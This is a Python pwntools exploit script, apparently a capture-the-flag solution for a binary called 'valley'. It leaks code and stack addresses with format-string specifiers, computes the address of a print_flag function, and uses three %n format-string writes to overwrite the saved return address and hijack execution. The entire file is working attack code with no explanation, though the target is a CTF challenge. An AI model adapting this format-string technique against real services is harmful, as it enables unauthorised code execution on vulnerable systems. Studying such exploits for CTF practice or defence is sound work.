#!/usr/bin/env python3

from pwn import remote,p64,context,ELF
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument('host',help='Host objetivo')
parser.add_argument('port',type=int,help='Puerto objetivo')

args = parser.parse_args()

context.binary = elf = ELF('./valley')

MAIN_OFFSET = elf.symbols['main']
FLAG_OFFSET = elf.symbols['print_flag']


r = remote(args.host,args.port)
print(r.recvline().decode())
r.sendline(b'%27$p')
response = r.recvline()

main_address = int(response.split(b' ')[5],16)
base_address = main_address - MAIN_OFFSET
flag_address = base_address + FLAG_OFFSET

high = (flag_address & 0xffff00000000) // 0x100000000
medium = (flag_address & 0xffff0000) // 0x10000
low = (flag_address & 0xffff)

r.sendline(b'%9$p')
response = r.recvline()
stack_adress = int(response.split(b' ')[5],16)
return_adress = stack_adress + 0x30

value = f'%{low}x'
index_format = "%1$p"
length = len(value + index_format)
padding = 'A'*(8 - (len(value + index_format)%8))

payload = value + index_format+padding
index_format = f"%{6+len(payload)//8}$n"
payload = value + index_format+padding
payload = payload.encode()
payload += p64(return_adress)
r.sendline(payload)

value = f'%{medium}x'
index_format = "%1$p"
length = len(value + index_format)
padding = 'A'*(8 - (len(value + index_format)%8))

payload = value + index_format+padding
index_format = f"%{6+len(payload)//8}$n"
payload = value + index_format+padding
payload = payload.encode()
payload += p64(return_adress+2)

r.sendline(payload)

value = f'%{high}x'
index_format = "%1$p"
length = len(value + index_format)
padding = 'A'*(8 - (len(value + index_format)%8))

payload = value + index_format+padding
index_format = f"%{6+len(payload)//8}$n"
payload = value + index_format+padding
payload = payload.encode()
payload += p64(return_adress+4)

r.sendline(payload)

r.sendline(b'exit')
r.recvline()
flag = r.recvline().decode()
print()
print(flag)

r.close()
